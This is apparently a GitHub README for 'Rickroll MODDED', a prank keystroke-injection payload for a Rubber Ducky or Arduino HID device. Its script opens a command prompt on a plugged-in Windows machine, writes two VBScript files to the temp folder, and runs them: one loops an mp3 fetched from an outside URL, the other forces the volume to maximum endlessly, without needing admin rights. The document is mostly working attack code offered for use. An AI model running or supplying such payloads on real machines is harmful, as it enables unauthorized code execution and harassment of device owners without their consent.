# Rickroll MODDED
This is a modification of the original "<a href="https://gitlab.com/WarKitteh/arduino-hid-rickroll">Rickroll</a>". It does the same thing, but it's got a big difference: It sets the volume to the maximum continuously. What happens if someone tries to get down the volume? A .vbs resets it to the maximum level. Oh, and it doesn't need admin permissions.

# About...
Version: 1.0

Author: BlueArduino20

# Code for Rubber Ducky
<pre><code>DELAY 3500
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 200
STRING cd %tmp% && copy con rickyou.vbs
ENTER
STRING While true
ENTER
STRING Dim oPlayer
ENTER
STRING Set oPlayer = CreateObject("WMPlayer.OCX")
ENTER
STRING oPlayer.URL = "https://pixelcoding.nl/download/rickroll.mp3"
ENTER
STRING oPlayer.controls.play
ENTER
STRING While oPlayer.playState <> 1 ' 1 = Stopped
ENTER
STRING WScript.Sleep 100
ENTER
STRING Wend
ENTER
STRING oPlayer.close
ENTER
STRING Wend
ENTER
DELAY 100
CTRL z
ENTER
STRING copy con volup.vbs
ENTER
STRING do
ENTER
STRING Set WshShell = CreateObject("WScript.Shell")
ENTER
STRING WshShell.SendKeys(chr(&hAF))
ENTER
STRING WScript.Sleep 10
ENTER
STRING loop
ENTER
CTRL z
ENTER
STRING start rickyou.vbs && volup.vbs
ENTER</pre></code>

# Code for Arduino

<a href="https://github.com/BlueArduino20/Rickroll-MODDED/blob/master/Rickroll-MODDED-for-Arduino.ino">Rickroll-MODDED-for-Arduino.ino</a>
